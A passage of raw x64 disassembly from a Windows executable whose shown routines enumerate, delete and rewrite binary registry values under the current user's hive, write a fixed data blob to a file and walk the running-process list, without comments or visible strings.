   1400043c8:	48 81 c4 a0 02 00 00 	add    $0x2a0,%rsp
   1400043cf:	5d                   	pop    %rbp
   1400043d0:	c3                   	ret
   1400043d1:	cc                   	int3
   1400043d2:	cc                   	int3
   1400043d3:	cc                   	int3
   1400043d4:	cc                   	int3
   1400043d5:	cc                   	int3
   1400043d6:	cc                   	int3
   1400043d7:	cc                   	int3
   1400043d8:	cc                   	int3
   1400043d9:	cc                   	int3
   1400043da:	cc                   	int3
   1400043db:	cc                   	int3
   1400043dc:	cc                   	int3
   1400043dd:	cc                   	int3
   1400043de:	cc                   	int3
   1400043df:	cc                   	int3
   1400043e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400043e5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400043ea:	55                   	push   %rbp
   1400043eb:	53                   	push   %rbx
   1400043ec:	56                   	push   %rsi
   1400043ed:	57                   	push   %rdi
   1400043ee:	41 56                	push   %r14
   1400043f0:	41 57                	push   %r15
   1400043f2:	48 8d ac 24 78 fe ff 	lea    -0x188(%rsp),%rbp
   1400043f9:	ff 
   1400043fa:	48 81 ec 88 02 00 00 	sub    $0x288,%rsp
   140004401:	4d 8b f8             	mov    %r8,%r15
   140004404:	45 33 f6             	xor    %r14d,%r14d
   140004407:	4c 89 b5 d8 01 00 00 	mov    %r14,0x1d8(%rbp)
   14000440e:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140004413:	48 8d 85 d8 01 00 00 	lea    0x1d8(%rbp),%rax
   14000441a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000441f:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140004424:	c7 44 24 28 1f 00 02 	movl   $0x2001f,0x28(%rsp)
   14000442b:	00 
   14000442c:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140004431:	45 33 c9             	xor    %r9d,%r9d
   140004434:	45 33 c0             	xor    %r8d,%r8d
   140004437:	48 8d 15 ca b7 03 00 	lea    0x3b7ca(%rip),%rdx        # 0x14003fc08
   14000443e:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140004445:	ff 15 b5 bb 02 00    	call   *0x2bbb5(%rip)        # 0x140030000
   14000444b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000444e:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140004454:	41 8b f6             	mov    %r14d,%esi
   140004457:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   14000445c:	41 8b fe             	mov    %r14d,%edi
   14000445f:	c7 85 d0 01 00 00 04 	movl   $0x104,0x1d0(%rbp)
   140004466:	01 00 00 
   140004469:	44 89 b5 c8 01 00 00 	mov    %r14d,0x1c8(%rbp)
   140004470:	44 89 b5 c0 01 00 00 	mov    %r14d,0x1c0(%rbp)
   140004477:	48 8d 85 c0 01 00 00 	lea    0x1c0(%rbp),%rax
   14000447e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004483:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140004488:	48 8d 85 c8 01 00 00 	lea    0x1c8(%rbp),%rax
   14000448f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004494:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140004499:	4c 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%r9
   1400044a0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400044a5:	33 d2                	xor    %edx,%edx
   1400044a7:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   1400044ae:	ff 15 64 bb 02 00    	call   *0x2bb64(%rip)        # 0x140030018
   1400044b4:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400044b9:	3d 03 01 00 00       	cmp    $0x103,%eax
   1400044be:	0f 84 fd 00 00 00    	je     0x1400045c1
   1400044c4:	85 c0                	test   %eax,%eax
   1400044c6:	0f 85 f5 00 00 00    	jne    0x1400045c1
   1400044cc:	83 bd c8 01 00 00 03 	cmpl   $0x3,0x1c8(%rbp)
   1400044d3:	0f 85 86 00 00 00    	jne    0x14000455f
   1400044d9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400044de:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400044e5:	48 ff c0             	inc    %rax
   1400044e8:	66 83 3c 41 00       	cmpw   $0x0,(%rcx,%rax,2)
   1400044ed:	75 f6                	jne    0x1400044e5
   1400044ef:	48 83 f8 15          	cmp    $0x15,%rax
   1400044f3:	75 6a                	jne    0x14000455f
   1400044f5:	48 3b de             	cmp    %rsi,%rbx
   1400044f8:	74 49                	je     0x140004543
   1400044fa:	4c 89 33             	mov    %r14,(%rbx)
   1400044fd:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   140004501:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140004508:	00 
   140004509:	66 44 89 33          	mov    %r14w,(%rbx)
   14000450d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140004512:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140004519:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004520:	49 ff c0             	inc    %r8
   140004523:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140004529:	75 f5                	jne    0x140004520
   14000452b:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004530:	48 8b cb             	mov    %rbx,%rcx
   140004533:	e8 c8 20 00 00       	call   0x140006600
   140004538:	48 83 c3 20          	add    $0x20,%rbx
   14000453c:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140004541:	eb 1c                	jmp    0x14000455f
   140004543:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004548:	48 8b d3             	mov    %rbx,%rdx
   14000454b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004550:	e8 bb 2d 00 00       	call   0x140007310
   140004555:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000455a:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000455f:	ff c7                	inc    %edi
   140004561:	c7 85 d0 01 00 00 04 	movl   $0x104,0x1d0(%rbp)
   140004568:	01 00 00 
   14000456b:	44 89 b5 c8 01 00 00 	mov    %r14d,0x1c8(%rbp)
   140004572:	44 89 b5 c0 01 00 00 	mov    %r14d,0x1c0(%rbp)
   140004579:	48 8d 85 c0 01 00 00 	lea    0x1c0(%rbp),%rax
   140004580:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004585:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   14000458a:	48 8d 85 c8 01 00 00 	lea    0x1c8(%rbp),%rax
   140004591:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004596:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000459b:	4c 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%r9
   1400045a2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400045a7:	8b d7                	mov    %edi,%edx
   1400045a9:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   1400045b0:	ff 15 62 ba 02 00    	call   *0x2ba62(%rip)        # 0x140030018
   1400045b6:	3d 03 01 00 00       	cmp    $0x103,%eax
   1400045bb:	0f 85 03 ff ff ff    	jne    0x1400044c4
   1400045c1:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400045c6:	49 8b fe             	mov    %r14,%rdi
   1400045c9:	4c 3b f3             	cmp    %rbx,%r14
   1400045cc:	74 25                	je     0x1400045f3
   1400045ce:	66 90                	xchg   %ax,%ax
   1400045d0:	48 8b d7             	mov    %rdi,%rdx
   1400045d3:	48 83 7f 18 08       	cmpq   $0x8,0x18(%rdi)
   1400045d8:	72 03                	jb     0x1400045dd
   1400045da:	48 8b 17             	mov    (%rdi),%rdx
   1400045dd:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   1400045e4:	ff 15 26 ba 02 00    	call   *0x2ba26(%rip)        # 0x140030010
   1400045ea:	48 83 c7 20          	add    $0x20,%rdi
   1400045ee:	48 3b fb             	cmp    %rbx,%rdi
   1400045f1:	75 dd                	jne    0x1400045d0
   1400045f3:	49 83 7f 18 08       	cmpq   $0x8,0x18(%r15)
   1400045f8:	72 03                	jb     0x1400045fd
   1400045fa:	4d 8b 3f             	mov    (%r15),%r15
   1400045fd:	c7 44 24 28 e0 0b 00 	movl   $0xbe0,0x28(%rsp)
   140004604:	00 
   140004605:	48 8d 05 b4 26 04 00 	lea    0x426b4(%rip),%rax        # 0x140046cc0
   14000460c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004611:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140004617:	45 33 c0             	xor    %r8d,%r8d
   14000461a:	49 8b d7             	mov    %r15,%rdx
   14000461d:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   140004624:	ff 15 de b9 02 00    	call   *0x2b9de(%rip)        # 0x140030008
   14000462a:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   140004631:	ff 15 e9 b9 02 00    	call   *0x2b9e9(%rip)        # 0x140030020
   140004637:	90                   	nop
   140004638:	4d 85 f6             	test   %r14,%r14
   14000463b:	74 3e                	je     0x14000467b
   14000463d:	48 8b d3             	mov    %rbx,%rdx
   140004640:	49 8b ce             	mov    %r14,%rcx
   140004643:	e8 e8 36 00 00       	call   0x140007d30
   140004648:	49 2b f6             	sub    %r14,%rsi
   14000464b:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   14000464f:	49 8b c6             	mov    %r14,%rax
   140004652:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   140004659:	72 15                	jb     0x140004670
   14000465b:	48 83 c6 27          	add    $0x27,%rsi
   14000465f:	4d 8b 76 f8          	mov    -0x8(%r14),%r14
   140004663:	49 2b c6             	sub    %r14,%rax
   140004666:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000466a:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000466e:	77 1b                	ja     0x14000468b
   140004670:	48 8b d6             	mov    %rsi,%rdx
   140004673:	49 8b ce             	mov    %r14,%rcx
   140004676:	e8 e5 57 00 00       	call   0x140009e60
   14000467b:	48 81 c4 88 02 00 00 	add    $0x288,%rsp
   140004682:	41 5f                	pop    %r15
   140004684:	41 5e                	pop    %r14
   140004686:	5f                   	pop    %rdi
   140004687:	5e                   	pop    %rsi
   140004688:	5b                   	pop    %rbx
   140004689:	5d                   	pop    %rbp
   14000468a:	c3                   	ret
   14000468b:	e8 90 07 01 00       	call   0x140014e20
   140004690:	cc                   	int3
   140004691:	cc                   	int3
   140004692:	cc                   	int3
   140004693:	cc                   	int3
   140004694:	cc                   	int3
   140004695:	cc                   	int3
   140004696:	cc                   	int3
   140004697:	cc                   	int3
   140004698:	cc                   	int3
   140004699:	cc                   	int3
   14000469a:	cc                   	int3
   14000469b:	cc                   	int3
   14000469c:	cc                   	int3
   14000469d:	cc                   	int3
   14000469e:	cc                   	int3
   14000469f:	cc                   	int3
   1400046a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400046aa:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400046af:	55                   	push   %rbp
   1400046b0:	57                   	push   %rdi
   1400046b1:	41 56                	push   %r14
   1400046b3:	48 8d 6c 24 80       	lea    -0x80(%rsp),%rbp
   1400046b8:	48 81 ec 80 01 00 00 	sub    $0x180,%rsp
   1400046bf:	48 8b fa             	mov    %rdx,%rdi
   1400046c2:	45 33 f6             	xor    %r14d,%r14d
   1400046c5:	44 89 b5 b8 00 00 00 	mov    %r14d,0xb8(%rbp)
   1400046cc:	48 8b d1             	mov    %rcx,%rdx
   1400046cf:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400046d3:	e8 b8 28 00 00       	call   0x140006f90
   1400046d8:	48 8b d8             	mov    %rax,%rbx
   1400046db:	4c 8b cf             	mov    %rdi,%r9
   1400046de:	48 83 7f 18 08       	cmpq   $0x8,0x18(%rdi)
   1400046e3:	72 03                	jb     0x1400046e8
   1400046e5:	4c 8b 0f             	mov    (%rdi),%r9
   1400046e8:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   1400046ec:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400046f0:	4c 8b 40 18          	mov    0x18(%rax),%r8
   1400046f4:	49 8b c0             	mov    %r8,%rax
   1400046f7:	48 2b c1             	sub    %rcx,%rax
   1400046fa:	48 3b d0             	cmp    %rax,%rdx
   1400046fd:	77 2b                	ja     0x14000472a
   1400046ff:	48 8d 34 11          	lea    (%rcx,%rdx,1),%rsi
   140004703:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140004707:	48 8b fb             	mov    %rbx,%rdi
   14000470a:	49 83 f8 08          	cmp    $0x8,%r8
   14000470e:	72 03                	jb     0x140004713
   140004710:	48 8b 3b             	mov    (%rbx),%rdi
   140004713:	48 8d 0c 4f          	lea    (%rdi,%rcx,2),%rcx
   140004717:	4c 8d 04 12          	lea    (%rdx,%rdx,1),%r8
   14000471b:	49 8b d1             	mov    %r9,%rdx
   14000471e:	e8 bd 75 00 00       	call   0x14000bce0
   140004723:	66 44 89 34 77       	mov    %r14w,(%rdi,%rsi,2)
   140004728:	eb 10                	jmp    0x14000473a
   14000472a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000472f:	48 8b cb             	mov    %rbx,%rcx
   140004732:	e8 89 36 00 00       	call   0x140007dc0
   140004737:	48 8b d8             	mov    %rax,%rbx
   14000473a:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   14000473f:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140004744:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140004749:	0f 10 03             	movups (%rbx),%xmm0
   14000474c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004751:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140004755:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   14000475a:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   14000475e:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140004765:	00 
   140004766:	66 44 89 33          	mov    %r14w,(%rbx)
   14000476a:	48 8b 55 78          	mov    0x78(%rbp),%rdx
   14000476e:	48 83 fa 08          	cmp    $0x8,%rdx
   140004772:	72 36                	jb     0x1400047aa
   140004774:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000477b:	00 
   14000477c:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140004780:	48 8b c1             	mov    %rcx,%rax
   140004783:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000478a:	72 19                	jb     0x1400047a5
   14000478c:	48 83 c2 27          	add    $0x27,%rdx
   140004790:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004794:	48 2b c1             	sub    %rcx,%rax
   140004797:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000479b:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000479f:	0f 87 ec 01 00 00    	ja     0x140004991
   1400047a5:	e8 b6 56 00 00       	call   0x140009e60
   1400047aa:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   1400047af:	48 83 7c 24 48 08    	cmpq   $0x8,0x48(%rsp)
   1400047b5:	48 0f 43 5c 24 30    	cmovae 0x30(%rsp),%rbx
   1400047bb:	48 8d 05 f6 b7 03 00 	lea    0x3b7f6(%rip),%rax        # 0x14003ffb8
   1400047c2:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400047c7:	4c 89 75 00          	mov    %r14,0x0(%rbp)
   1400047cb:	4c 89 75 28          	mov    %r14,0x28(%rbp)
   1400047cf:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047d2:	66 0f 7f 45 30       	movdqa %xmm0,0x30(%rbp)
   1400047d7:	c7 85 b8 00 00 00 03 	movl   $0x3,0xb8(%rbp)
   1400047de:	00 00 00 
   1400047e1:	48 8d 35 30 b8 03 00 	lea    0x3b830(%rip),%rsi        # 0x140040018
   1400047e8:	48 89 75 f8          	mov    %rsi,-0x8(%rbp)
   1400047ec:	c7 45 f4 98 00 00 00 	movl   $0x98,-0xc(%rbp)
   1400047f3:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400047f8:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400047fc:	e8 3f 25 00 00       	call   0x140006d40
   140004801:	90                   	nop
   140004802:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140004807:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000480b:	48 8d 3d 8e b7 03 00 	lea    0x3b78e(%rip),%rdi        # 0x14003ffa0
   140004812:	48 89 7c 0c 50       	mov    %rdi,0x50(%rsp,%rcx,1)
   140004817:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000481c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004820:	44 8d 81 58 ff ff ff 	lea    -0xa8(%rcx),%r8d
   140004827:	44 89 44 0c 4c       	mov    %r8d,0x4c(%rsp,%rcx,1)
   14000482c:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004831:	e8 6a 23 00 00       	call   0x140006ba0
   140004836:	90                   	nop
   140004837:	48 8b d3             	mov    %rbx,%rdx
   14000483a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000483f:	e8 ac 22 00 00       	call   0x140006af0
   140004844:	48 85 c0             	test   %rax,%rax
   140004847:	75 20                	jne    0x140004869
   140004849:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000484e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004852:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004857:	48 03 c8             	add    %rax,%rcx
   14000485a:	8b 51 10             	mov    0x10(%rcx),%edx
   14000485d:	83 ca 02             	or     $0x2,%edx
   140004860:	45 33 c0             	xor    %r8d,%r8d
   140004863:	e8 08 1d 00 00       	call   0x140006570
   140004868:	90                   	nop
   140004869:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000486e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004872:	48 89 7c 0c 50       	mov    %rdi,0x50(%rsp,%rcx,1)
   140004877:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000487c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004880:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004886:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   14000488a:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   14000488f:	74 46                	je     0x1400048d7
   140004891:	41 b8 e0 0b 00 00    	mov    $0xbe0,%r8d
   140004897:	48 8d 15 22 24 04 00 	lea    0x42422(%rip),%rdx        # 0x140046cc0
   14000489e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400048a3:	e8 d8 13 00 00       	call   0x140005c80
   1400048a8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400048ad:	e8 8e 1b 00 00       	call   0x140006440
   1400048b2:	48 85 c0             	test   %rax,%rax
   1400048b5:	75 20                	jne    0x1400048d7
   1400048b7:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400048bc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048c0:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400048c5:	48 03 c8             	add    %rax,%rcx
   1400048c8:	8b 51 10             	mov    0x10(%rcx),%edx
   1400048cb:	83 ca 02             	or     $0x2,%edx
   1400048ce:	45 33 c0             	xor    %r8d,%r8d
   1400048d1:	e8 9a 1c 00 00       	call   0x140006570
   1400048d6:	90                   	nop
   1400048d7:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400048dc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048e0:	48 89 7c 0c 50       	mov    %rdi,0x50(%rsp,%rcx,1)
   1400048e5:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400048ea:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048ee:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   1400048f4:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   1400048f8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400048fd:	e8 1e 0f 00 00       	call   0x140005820
   140004902:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140004907:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000490b:	48 89 74 0c 50       	mov    %rsi,0x50(%rsp,%rcx,1)
   140004910:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140004915:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004919:	8d 51 f0             	lea    -0x10(%rcx),%edx
   14000491c:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140004920:	48 8d 05 e1 b5 03 00 	lea    0x3b5e1(%rip),%rax        # 0x14003ff08
   140004927:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000492b:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   14000492f:	e8 78 46 00 00       	call   0x140008fac
   140004934:	90                   	nop
   140004935:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000493a:	48 83 fa 08          	cmp    $0x8,%rdx
   14000493e:	72 33                	jb     0x140004973
   140004940:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004947:	00 
   140004948:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000494d:	48 8b c1             	mov    %rcx,%rax
   140004950:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004957:	72 15                	jb     0x14000496e
   140004959:	48 83 c2 27          	add    $0x27,%rdx
   14000495d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004961:	48 2b c1             	sub    %rcx,%rax
   140004964:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004968:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000496c:	77 1d                	ja     0x14000498b
   14000496e:	e8 ed 54 00 00       	call   0x140009e60
   140004973:	4c 8d 9c 24 80 01 00 	lea    0x180(%rsp),%r11
   14000497a:	00 
   14000497b:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000497f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140004983:	49 8b e3             	mov    %r11,%rsp
   140004986:	41 5e                	pop    %r14
   140004988:	5f                   	pop    %rdi
   140004989:	5d                   	pop    %rbp
   14000498a:	c3                   	ret
   14000498b:	e8 90 04 01 00       	call   0x140014e20
   140004990:	90                   	nop
   140004991:	e8 8a 04 01 00       	call   0x140014e20
   140004996:	90                   	nop
   140004997:	cc                   	int3
   140004998:	cc                   	int3
   140004999:	cc                   	int3
   14000499a:	cc                   	int3
   14000499b:	cc                   	int3
   14000499c:	cc                   	int3
   14000499d:	cc                   	int3
   14000499e:	cc                   	int3
   14000499f:	cc                   	int3
   1400049a0:	40 53                	rex push %rbx
   1400049a2:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   1400049a9:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400049ae:	e8 3d d4 ff ff       	call   0x140001df0
   1400049b3:	90                   	nop
   1400049b4:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   1400049b9:	e8 22 fa ff ff       	call   0x1400043e0
   1400049be:	33 d2                	xor    %edx,%edx
   1400049c0:	8d 4a 02             	lea    0x2(%rdx),%ecx
   1400049c3:	ff 15 87 b6 02 00    	call   *0x2b687(%rip)        # 0x140030050
   1400049c9:	48 8b d8             	mov    %rax,%rbx
   1400049cc:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400049d0:	74 78                	je     0x140004a4a
   1400049d2:	33 d2                	xor    %edx,%edx
   1400049d4:	41 b8 34 02 00 00    	mov    $0x234,%r8d
   1400049da:	48 8d 8c 24 84 00 00 	lea    0x84(%rsp),%rcx
   1400049e1:	00 
   1400049e2:	e8 a9 79 00 00       	call   0x14000c390
   1400049e7:	c7 84 24 80 00 00 00 	movl   $0x238,0x80(%rsp)
   1400049ee:	38 02 00 00 
   1400049f2:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   1400049f9:	00 
   1400049fa:	48 8b cb             	mov    %rbx,%rcx
   1400049fd:	ff 15 e5 b6 02 00    	call   *0x2b6e5(%rip)        # 0x1400300e8
   140004a03:	85 c0                	test   %eax,%eax
   140004a05:	74 3a                	je     0x140004a41
   140004a07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004a0e:	00 00 
   140004a10:	48 8d 15 79 a1 03 00 	lea    0x3a179(%rip),%rdx        # 0x14003eb90
   140004a17:	48 8d 8c 24 ac 00 00 	lea    0xac(%rsp),%rcx
   140004a1e:	00 
   140004a1f:	e8 2c e4 00 00       	call   0x140012e50
   140004a24:	48 8b cb             	mov    %rbx,%rcx
   140004a27:	85 c0                	test   %eax,%eax
   140004a29:	0f 84 2f 01 00 00    	je     0x140004b5e
   140004a2f:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140004a36:	00 
   140004a37:	ff 15 23 b6 02 00    	call   *0x2b623(%rip)        # 0x140030060
   140004a3d:	85 c0                	test   %eax,%eax
   140004a3f:	75 cf                	jne    0x140004a10
   140004a41:	48 8b cb             	mov    %rbx,%rcx
   140004a44:	ff 15 2e b6 02 00    	call   *0x2b62e(%rip)        # 0x140030078
   140004a4a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004a4f:	e8 8c f4 ff ff       	call   0x140003ee0
   140004a54:	90                   	nop
   140004a55:	33 c0                	xor    %eax,%eax
   140004a57:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004a5c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004a61:	48 c7 44 24 38 07 00 	movq   $0x7,0x38(%rsp)
   140004a68:	00 00 
   140004a6a:	66 89 44 24 20       	mov    %ax,0x20(%rsp)
   140004a6f:	44 8d 40 06          	lea    0x6(%rax),%r8d
   140004a73:	48 8d 15 9e b1 03 00 	lea    0x3b19e(%rip),%rdx        # 0x14003fc18
   140004a7a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a7f:	e8 7c 1b 00 00       	call   0x140006600
   140004a84:	90                   	nop
   140004a85:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004a8a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004a8f:	e8 0c fc ff ff       	call   0x1400046a0
   140004a94:	90                   	nop
   140004a95:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140004a9a:	48 83 fa 08          	cmp    $0x8,%rdx
   140004a9e:	72 38                	jb     0x140004ad8
   140004aa0:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004aa7:	00 
   140004aa8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004aad:	48 8b c1             	mov    %rcx,%rax
   140004ab0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004ab7:	72 19                	jb     0x140004ad2
   140004ab9:	48 83 c2 27          	add    $0x27,%rdx
   140004abd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004ac1:	48 2b c1             	sub    %rcx,%rax
   140004ac4:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004ac8:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004acc:	0f 87 9b 00 00 00    	ja     0x140004b6d
   140004ad2:	e8 89 53 00 00       	call   0x140009e60
   140004ad7:	90                   	nop
   140004ad8:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140004add:	48 83 fa 08          	cmp    $0x8,%rdx
   140004ae1:	72 34                	jb     0x140004b17
   140004ae3:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004aea:	00 
   140004aeb:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004af0:	48 8b c1             	mov    %rcx,%rax
   140004af3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004afa:	72 15                	jb     0x140004b11
   140004afc:	48 83 c2 27          	add    $0x27,%rdx
   140004b00:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004b04:	48 2b c1             	sub    %rcx,%rax
   140004b07:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004b0b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004b0f:	77 62                	ja     0x140004b73
   140004b11:	e8 4a 53 00 00       	call   0x140009e60
   140004b16:	90                   	nop
   140004b17:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140004b1c:	48 83 fa 08          	cmp    $0x8,%rdx
   140004b20:	72 33                	jb     0x140004b55
   140004b22:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004b29:	00 
   140004b2a:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004b2f:	48 8b c1             	mov    %rcx,%rax
   140004b32:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004b39:	72 15                	jb     0x140004b50
   140004b3b:	48 83 c2 27          	add    $0x27,%rdx
   140004b3f:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004b43:	48 2b c1             	sub    %rcx,%rax
   140004b46:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004b4a:	48 83 f8 1f          	cmp    $0x1f,%rax
